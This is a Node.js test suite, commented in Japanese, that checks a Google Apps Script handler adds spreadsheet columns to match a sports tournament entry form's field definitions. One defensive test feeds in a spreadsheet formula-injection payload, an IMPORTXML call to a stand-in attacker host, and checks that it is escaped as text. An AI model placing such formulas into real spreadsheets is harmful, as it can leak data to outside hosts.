// 申込フォームの項目定義 → 集計スプレッドシートの列 の自動追随テスト。
//
// 背景: 申込フォームは field_config で「ふりがな・学年・性別・主催者定義の自由項目」を
// 収集できるのに、GAS 側の書き込みが固定配列 appendRow で、それらを一切列に出していなかった
// (データは GAS まで届いているのにシートに書かれず消えていた)。
// 対策として「フォーム定義が正本・シートの列はその導出」に変え、サーバが form_schema を同梱し
// GAS が不足列を右端に自動追記する方式にした。ここではその不変条件を検証する:
//   ① form_schema 無し(旧プラットフォーム)では従来と1セルも変わらない
//   ② 定義した項目は必ず列になり、正しい列に値が入る
//   ③ 既存列の位置・順序は絶対に変わらない(集計用シート/種目別リストが位置で読むため)
//   ④ 2回目以降の申込で列が重複しない
//   ⑤ 自由項目のラベルが固定列名と衝突しても固定列を壊さない
const { test } = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const db = require("../db.js");

// ── GAS スクリプトを Node 上で評価して純ロジックを取り出す ──────────────
// (.gs は require できないため。トップレベルは定数と関数定義のみで副作用が無い)
const GAS_SRC = fs.readFileSync(path.join(__dirname, "..", "gas", "entry_form_handler.gs"), "utf8");
const sandbox = { console, JSON, String, Number, Array, Object, Math, Date };
vm.createContext(sandbox);
vm.runInContext(GAS_SRC + `
;globalThis.__api = { ensureColumns, appendRowWithExtras, uniqueLabels, schemaColumns,
  submissionValue, playerValue, memberValue, distributeEntries,
  TEAM_HEADERS, SINGLES_HEADERS, DOUBLES_HEADERS, MIXED_HEADERS, LEDGER_HEADERS };
`, sandbox);
const G = sandbox.__api;
// vm 内で作られた配列は別realm(Array の prototype が異なり deepStrictEqual が通らない)ため、
// 比較に使うヘッダ定数は Node 側の配列にコピーして扱う。
const H = {
  TEAM: Array.from(G.TEAM_HEADERS),
  SINGLES: Array.from(G.SINGLES_HEADERS),
  DOUBLES: Array.from(G.DOUBLES_HEADERS),
  MIXED: Array.from(G.MIXED_HEADERS),
  LEDGER: Array.from(G.LEDGER_HEADERS),
};

// ── 擬似スプレッドシート(必要な API だけ実装) ─────────────────────────
function fakeSheet(headers, opts) {
  const grid = [headers.slice()];
  const chain = { setFontWeight() { return chain; }, setBackground() { return chain; } };
  // Google スプレッドシートの「物理的な列数」を再現する(既定26列)。範囲外に書こうとすると
  // 実機では例外になるため、擬似シートでも同じように失敗させて回帰を検出する。
  let maxColumns = (opts && opts.maxColumns) || 1000;
  const name = (opts && opts.name) || ("sheet" + Math.random());
  return {
    grid,
    getSheetName() { return name; },
    getMaxColumns() { return maxColumns; },
    insertColumnsAfter(after, n) { maxColumns += n; return this; },
    getLastColumn() { return grid.reduce((m, r) => Math.max(m, r.length), 0); },
    getLastRow() { return grid.length; },
    getRange(r, c, nr, nc) {
      const rows = nr == null ? 1 : nr, cols = nc == null ? 1 : nc;
      if (c + cols - 1 > maxColumns) {
        throw new Error("範囲外の列に書き込もうとしました: " + (c + cols - 1) + " > 最大 " + maxColumns);
      }
      return {
        getValues() {
          const out = [];
          for (let i = 0; i < rows; i++) {
            const src = grid[r - 1 + i] || [];
            const line = [];
            for (let j = 0; j < cols; j++) line.push(src[c - 1 + j] == null ? "" : src[c - 1 + j]);
            out.push(line);
          }
          return out;
        },
        setValues(vals) {
          vals.forEach((line, i) => {
            const target = grid[r - 1 + i] || (grid[r - 1 + i] = []);
            line.forEach((v, j) => { target[c - 1 + j] = v; });
          });
          return chain;
        },
        setFontWeight() { return chain; },
        setBackground() { return chain; },
      };
    },
    appendRow(row) { grid.push(row.slice()); },
  };
}
function fakeSS(sheets) {
  return { getSheetByName(name) { return sheets[name] || null; } };
}
let _sheetSerial = 0;
function makeSheets(opts) {
  // シート名はテストごとに一意にする(GAS 側が1リクエスト内で列マップをキャッシュするため、
  // 同名だと前のテストの結果を拾ってしまう)。
  const gen = ++_sheetSerial;
  const mk = (headers, key) => fakeSheet(headers, { name: key + "#" + gen, maxColumns: (opts && opts.maxColumns) || 1000 });
  return {
    "団体": mk(H.TEAM, "団体"),
    "ダブルス": mk(H.DOUBLES, "ダブルス"),
    "ミックス": mk(H.MIXED, "ミックス"),
    "シングルス": mk(H.SINGLES, "シングルス"),
    "お弁当、懇親会": mk(["お弁当", "", "", "懇親会"], "弁当"),
  };
}
const headerOf = (sh) => sh.grid[0];
const rowsOf = (sh) => sh.grid.slice(1);
const cellAt = (sh, rowIdx, header) => {
  const c = headerOf(sh).indexOf(header);
  assert.ok(c >= 0, `列「${header}」が存在すること (実際: ${JSON.stringify(headerOf(sh))})`);
  return rowsOf(sh)[rowIdx][c];
};

// ── ① 旧プラットフォーム(form_schema 無し)= 従来どおり ────────────────
test("form_schema が無い送信では列も値も従来と完全に同じ", () => {
  const sheets = makeSheets();
  G.distributeEntries(fakeSS(sheets), {
    team_name: "釧路クラブ",
    entries: [{ event: "男子シングルス", type: "singles", name: "山田 太郎", age: 30, team: "釧路ク" }],
  });
  assert.deepStrictEqual(headerOf(sheets["シングルス"]), H.SINGLES, "ヘッダが増えないこと");
  assert.deepStrictEqual(rowsOf(sheets["シングルス"])[0],
    ["男子シングルス", "一般男子", "山田 太郎", 30, "釧路ク"]);
});

// ── ② 定義した項目が列になり、正しい列に値が入る ──────────────────────
test("ふりがな・学年・自由項目を可視にすると、その列が自動で作られ値が入る", () => {
  const tournament = {
    id: "t1",
    event_config: JSON.stringify([{ name: "男子シングルス" }]),
    field_config: JSON.stringify({
      version: 2,
      fields: { furigana: "required", grade: "optional" },
      custom: [{ key: "shoes", label: "シューズサイズ", type: "text", scope: "player" }],
    }),
  };
  const schema = db.buildFormSchema(tournament);
  const sheets = makeSheets();
  G.distributeEntries(fakeSS(sheets), {
    team_name: "釧路クラブ",
    form_schema: schema,
    entries: [{
      event: "男子シングルス", type: "singles", name: "山田 太郎", age: 30, team: "釧路ク",
      furigana: "やまだ たろう",
      extra_json: { grade: "中2", answers: { shoes: "26.5" } },
    }],
  });
  const sh = sheets["シングルス"];
  assert.deepStrictEqual(headerOf(sh).slice(0, 5), H.SINGLES, "既存列は先頭に不変であること");
  assert.deepStrictEqual(headerOf(sh).slice(5), ["ふりがな", "学年", "シューズサイズ"]);
  assert.strictEqual(cellAt(sh, 0, "ふりがな"), "やまだ たろう");
  assert.strictEqual(cellAt(sh, 0, "学年"), "中2");
  assert.strictEqual(cellAt(sh, 0, "シューズサイズ"), "26.5");
  assert.strictEqual(cellAt(sh, 0, "氏名"), "山田 太郎", "固定列の値がずれないこと");
});

// ── ③④ 既存列の位置不変・2回目で重複しない ─────────────────────────
test("2件目の申込で列が重複せず、既存列の位置も変わらない", () => {
  const tournament = {
    id: "t2", event_config: JSON.stringify([{ name: "男子シングルス" }]),
    field_config: JSON.stringify({ version: 2, fields: { furigana: "required" } }),
  };
  const schema = db.buildFormSchema(tournament);
  const sheets = makeSheets();
  const ss = fakeSS(sheets);
  const mk = (name, furi) => ({
    team_name: "T", form_schema: schema,
    entries: [{ event: "男子シングルス", type: "singles", name, age: 20, team: "T", furigana: furi }],
  });
  G.distributeEntries(ss, mk("一人目", "ひとりめ"));
  G.distributeEntries(ss, mk("二人目", "ふたりめ"));
  const sh = sheets["シングルス"];
  assert.deepStrictEqual(headerOf(sh), H.SINGLES.concat(["ふりがな"]), "列が重複追加されないこと");
  assert.strictEqual(rowsOf(sh).length, 2);
  assert.strictEqual(cellAt(sh, 1, "ふりがな"), "ふたりめ");
});

test("主催者が手で足した列は消さず、その右に追記する", () => {
  const sheets = makeSheets();
  // 主催者が「支払状況」を手で足した状態を再現
  sheets["シングルス"].grid[0].push("支払状況");
  const tournament = {
    id: "t3", event_config: "[]",
    field_config: JSON.stringify({ version: 2, fields: { furigana: "required" } }),
  };
  G.distributeEntries(fakeSS(sheets), {
    team_name: "T", form_schema: db.buildFormSchema(tournament),
    entries: [{ event: "S", type: "singles", name: "A", age: 1, team: "T", furigana: "え" }],
  });
  const sh = sheets["シングルス"];
  assert.deepStrictEqual(headerOf(sh), H.SINGLES.concat(["支払状況", "ふりがな"]));
  assert.strictEqual(cellAt(sh, 0, "ふりがな"), "え");
  assert.strictEqual(cellAt(sh, 0, "支払状況"), "", "手動列は空のまま保持されること");
});

// ── ダブルス: 選手1/選手2 で列が分かれる ─────────────────────────────
test("ダブルスは選手1と選手2で別々の列になり、値が入れ替わらない", () => {
  const tournament = {
    id: "t4", event_config: "[]",
    field_config: JSON.stringify({
      version: 2, fields: { furigana: "required", grade: "optional" },
      custom: [{ key: "shoes", label: "靴", type: "text", scope: "player" }],
    }),
  };
  const sheets = makeSheets();
  G.distributeEntries(fakeSS(sheets), {
    team_name: "T", form_schema: db.buildFormSchema(tournament),
    entries: [{
      event: "男子ダブルス", type: "doubles",
      name1: "甲", age1: 20, name2: "乙", age2: 30, team1: "A", team2: "B",
      furigana1: "こう", furigana2: "おつ",
      extra_json: { players: [{ grade: "高1", answers: { shoes: "26" } }, { grade: "高3", answers: { shoes: "28" } }] },
    }],
  });
  const sh = sheets["ダブルス"];
  assert.deepStrictEqual(headerOf(sh).slice(0, 8), H.DOUBLES);
  assert.deepStrictEqual(headerOf(sh).slice(8),
    ["ふりがな1", "学年1", "靴1", "ふりがな2", "学年2", "靴2"]);
  assert.strictEqual(cellAt(sh, 0, "ふりがな1"), "こう");
  assert.strictEqual(cellAt(sh, 0, "ふりがな2"), "おつ");
  assert.strictEqual(cellAt(sh, 0, "学年1"), "高1");
  assert.strictEqual(cellAt(sh, 0, "学年2"), "高3");
  assert.strictEqual(cellAt(sh, 0, "靴1"), "26");
  assert.strictEqual(cellAt(sh, 0, "靴2"), "28");
});

test("ミックスは男子行・女子行それぞれに本人の値が入る", () => {
  const tournament = {
    id: "t5", event_config: "[]",
    field_config: JSON.stringify({ version: 2, fields: { furigana: "required" } }),
  };
  const sheets = makeSheets();
  G.distributeEntries(fakeSS(sheets), {
    team_name: "T", form_schema: db.buildFormSchema(tournament),
    entries: [{
      event: "ミックスダブルス", type: "mixed",
      name1: "夫", age1: 40, name2: "妻", age2: 38,
      furigana1: "おっと", furigana2: "つま",
    }],
  });
  const sh = sheets["ミックス"];
  assert.strictEqual(rowsOf(sh).length, 2);
  assert.strictEqual(cellAt(sh, 0, "ふりがな"), "おっと");
  assert.strictEqual(cellAt(sh, 1, "ふりがな"), "つま");
});

// ── ⑤ ラベル衝突 ────────────────────────────────────────────────
test("自由項目のラベルが固定列名と衝突しても固定列を壊さない", () => {
  const tournament = {
    id: "t6", event_config: "[]",
    field_config: JSON.stringify({
      version: 2, fields: {},
      custom: [{ key: "nickname", label: "氏名", type: "text", scope: "player" }],
    }),
  };
  const sheets = makeSheets();
  G.distributeEntries(fakeSS(sheets), {
    team_name: "T", form_schema: db.buildFormSchema(tournament),
    entries: [{ event: "S", type: "singles", name: "本名 太郎", age: 20, team: "T",
      extra_json: { answers: { nickname: "たろちゃん" } } }],
  });
  const sh = sheets["シングルス"];
  assert.deepStrictEqual(headerOf(sh), H.SINGLES.concat(["氏名(2)"]));
  assert.strictEqual(cellAt(sh, 0, "氏名"), "本名 太郎", "固定の氏名列が上書きされないこと");
  assert.strictEqual(cellAt(sh, 0, "氏名(2)"), "たろちゃん");
});

// ── チェックボックス・空値の扱い ────────────────────────────────────
test("チェックボックスは○/空で記録され、未回答は空欄になる", () => {
  const tournament = {
    id: "t7", event_config: "[]",
    field_config: JSON.stringify({
      version: 2, fields: {},
      custom: [{ key: "bus", label: "バス利用", type: "checkbox", scope: "player" }],
    }),
  };
  const sheets = makeSheets();
  G.distributeEntries(fakeSS(sheets), {
    team_name: "T", form_schema: db.buildFormSchema(tournament),
    entries: [
      { event: "S", type: "singles", name: "使う", age: 1, team: "T", extra_json: { answers: { bus: true } } },
      { event: "S", type: "singles", name: "使わない", age: 2, team: "T" },
    ],
  });
  const sh = sheets["シングルス"];
  assert.strictEqual(cellAt(sh, 0, "バス利用"), "○");
  assert.strictEqual(cellAt(sh, 1, "バス利用"), "", "未回答は空欄(undefined を書かない)");
});

// ── 種目別に可視状態が違う場合(union) ──────────────────────────────
test("一部の種目だけで可視の項目も列になる(全種目共通の1枚のため)", () => {
  const tournament = {
    id: "t8",
    event_config: JSON.stringify([{ name: "中学男子" }, { name: "一般男子" }]),
    field_config: JSON.stringify({
      version: 2, fields: { grade: "hidden" },
      event_overrides: { "中学男子": { grade: "required" } },
    }),
  };
  const schema = db.buildFormSchema(tournament);
  assert.deepStrictEqual(schema.columns.player.map(c => c.key), ["grade"]);
});

// ── 申込台帳(顧問・申込単位の自由項目) ─────────────────────────────
test("申込台帳スキーマに顧問と申込単位の自由項目が載る", () => {
  const tournament = {
    id: "t9", event_config: "[]",
    field_config: JSON.stringify({
      version: 2, fields: { advisor: "optional" },
      custom: [
        { key: "bus", label: "貸切バス", type: "checkbox", scope: "submission" },
        { key: "shoes", label: "靴", type: "text", scope: "player" },
      ],
    }),
  };
  const s = db.buildFormSchema(tournament);
  assert.deepStrictEqual(s.columns.ledger, [
    { key: "advisor", label: "顧問" },
    { key: "cust:bus", label: "貸切バス" },
  ]);
  assert.deepStrictEqual(s.columns.player, [{ key: "cust:shoes", label: "靴" }]);
  assert.strictEqual(G.submissionValue({ advisor: "佐藤" }, "advisor"), "佐藤");
  assert.strictEqual(G.submissionValue({ extra: { bus: true } }, "cust:bus"), "○");
  assert.strictEqual(G.submissionValue({}, "cust:bus"), "");
});

// ── 既定(空設定)では列が1本も増えない = 既存大会の見た目が変わらない ────
test("設定が空の既存大会では追加列がゼロ", () => {
  const s = db.buildFormSchema({ id: "t10", event_config: "[]" });
  assert.deepStrictEqual(s.columns.ledger, []);
  assert.deepStrictEqual(s.columns.player, []);
});

// ── 壊れた入力への耐性 ──────────────────────────────────────────
test("form_schema が壊れていても例外を出さず従来動作にフォールバックする", () => {
  const sheets = makeSheets();
  const bad = [null, "文字列", { columns: null }, { columns: { player: "配列でない" } },
    { columns: { player: [{ label: "キー無し" }, { key: "x" }, null] } }];
  bad.forEach((fs2, i) => {
    G.distributeEntries(fakeSS(sheets), {
      team_name: "T", form_schema: fs2,
      entries: [{ event: "S", type: "singles", name: "選手" + i, age: 1, team: "T" }],
    });
  });
  const sh = sheets["シングルス"];
  assert.deepStrictEqual(headerOf(sh), H.SINGLES, "不正な定義から列を作らないこと");
  assert.strictEqual(rowsOf(sh).length, bad.length, "全件が記録されること");
});

// ── シートの物理的な列数(既定26列)を超える場合 ──────────────────────
test("列数の上限を超える項目数でも、列を拡張して全件記録できる", () => {
  const custom = [];
  for (let i = 1; i <= 30; i++) custom.push({ key: "q" + i, label: "設問" + i, type: "text", scope: "player" });
  const tournament = {
    id: "tmax", event_config: "[]",
    field_config: JSON.stringify({ version: 2, fields: {}, custom }),
  };
  const sheets = makeSheets({ maxColumns: 26 });   // 新規スプレッドシートの既定
  const answers = {};
  custom.forEach((c, i) => { answers[c.key] = "回答" + (i + 1); });
  assert.doesNotThrow(() => {
    G.distributeEntries(fakeSS(sheets), {
      team_name: "T", form_schema: db.buildFormSchema(tournament),
      entries: [{ event: "S", type: "singles", name: "選手", age: 20, team: "T",
        extra_json: { answers } }],
    });
  }, "列を足せずに申込がまるごと落ちないこと");
  const sh = sheets["シングルス"];
  assert.strictEqual(headerOf(sh).length, H.SINGLES.length + 30);
  assert.strictEqual(cellAt(sh, 0, "設問30"), "回答30");
});

test("自由項目の個数は上限で頭打ちになる(誤操作で列が無限に増えない)", () => {
  const custom = [];
  for (let i = 1; i <= 200; i++) custom.push({ key: "q" + i, label: "設問" + i, type: "text", scope: "player" });
  const cleaned = db.sanitizeFieldConfig
    ? db.sanitizeFieldConfig({ version: 2, fields: {}, custom })
    : null;
  if (cleaned) assert.strictEqual(cleaned.custom.length, 50);
});

// ── 数式インジェクション ────────────────────────────────────────
test("=で始まる回答がスプレッドシートの数式として実行されない", () => {
  const tournament = {
    id: "tinj", event_config: "[]",
    field_config: JSON.stringify({
      version: 2, fields: {},
      custom: [{ key: "free", label: "自由記入", type: "text", scope: "player" }],
    }),
  };
  const sheets = makeSheets();
  G.distributeEntries(fakeSS(sheets), {
    team_name: "T", form_schema: db.buildFormSchema(tournament),
    entries: [{ event: "S", type: "singles", name: "選手", age: 20, team: "T",
      extra_json: { answers: { free: '=IMPORTXML("http://evil.example/","//x")' } } }],
  });
  const v = cellAt(sheets["シングルス"], 0, "自由記入");
  assert.ok(String(v).startsWith("'="), "先頭にアポストロフィが付き文字列として記録されること: " + v);
});

// ── フォームの見出しとシートの列名が同じ定義から作られること ──────────────
test("項目名を変えるとフォームの見出しとシート列名が同時に変わる", () => {
  const entryForm = require("../entry_form.js");
  const fc = {
    version: 2,
    fields: { furigana: "required", advisor: "optional" },
    field_meta: { furigana: { label: "よみがな" }, advisor: { label: "部活動顧問" } },
    custom: [], event_overrides: {},
  };
  const tournament = { id: "tl", name: "検証大会", date: "2026-09-01", venue: "会場",
    field_config: JSON.stringify(fc), event_config: JSON.stringify([{ name: "男子シングルス" }]) };
  const html = entryForm.buildEntryFormHTML(tournament,
    [{ name: "男子シングルス", type: "singles", fee: 1000 }],
    { field_config: db.resolveFieldConfig(tournament) });
  assert.ok(html.includes("よみがな"), "フォームの見出しが変更後の名前になること");
  assert.ok(html.includes("部活動顧問"), "連絡先セクションの見出しも変更されること");
  const s = db.buildFormSchema(tournament);
  assert.deepStrictEqual(s.columns.player.map(c => c.label), ["よみがな"]);
  assert.deepStrictEqual(s.columns.ledger.map(c => c.label), ["部活動顧問"]);
});

test("sanitizeFieldConfig が field_meta を安全に受け取る", () => {
  const t = db.saveTournamentSettings ? null : null;   // 参照のみ(保存はしない)
  const cfg = db.resolveFieldConfig({
    field_config: JSON.stringify({ version: 2, fields: {}, field_meta: { grade: { label: "学年(表記)" } } }),
  });
  assert.strictEqual(db.fieldLabelOf(cfg, "grade"), "学年(表記)");
  assert.strictEqual(db.fieldLabelOf(cfg, "furigana"), "ふりがな", "未指定は既定ラベル");
  assert.strictEqual(t, null);
});
